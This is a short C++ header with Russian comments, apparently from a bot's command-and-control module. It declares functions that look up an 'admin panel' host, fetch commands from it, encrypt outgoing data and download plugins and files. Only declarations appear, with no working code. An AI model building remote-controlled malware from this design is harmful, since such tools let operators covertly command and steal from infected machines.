#include "core\core.h"
#include "core\debug.h"

namespace AdminPanel
{

const int DEF = 0; //обычная админка

bool Init();
void Release();

//возвращает хост текущей админки
//type - 0 Config::Hosts (обычная админка), 1 - Config::HostsAZ (админка AZ)
bool GetHostAdmin( int type, StringBuilder& host );
//возвращает текст команды от админки
bool GetCmd( StringBuilder& cmd );
//шифрует массив данных, в dst будет в бинарном виде IV (8 байт) + шифрованные данные
bool EncryptToBin( const void* data, int c_data, Mem::Data& dst );
inline bool EncryptToBin( const Mem::Data& src, Mem::Data& dst )
{
	return EncryptToBin( src.Ptr(), src.Len(), dst );
}
//шифрует массив данных и переводит их в base64 с заменой некоторых символов, в dst будет IV + шифрованные данные в base64 (итогом будет строка)
bool EncryptToText( const void* data, int c_data, StringBuilder& dst );
inline bool EncryptToText( const Mem::Data& src, StringBuilder& dst )
{
	return EncryptToText( src.Ptr(), src.Len(), dst );
}
//расшифровывает строку
bool Decrypt( const Mem::Data& src, Mem::Data& dst );

bool LoadPlugin( const char* namePlugin, Mem::Data& plugin );
bool LoadFile( const char* url, Mem::Data& data );

}
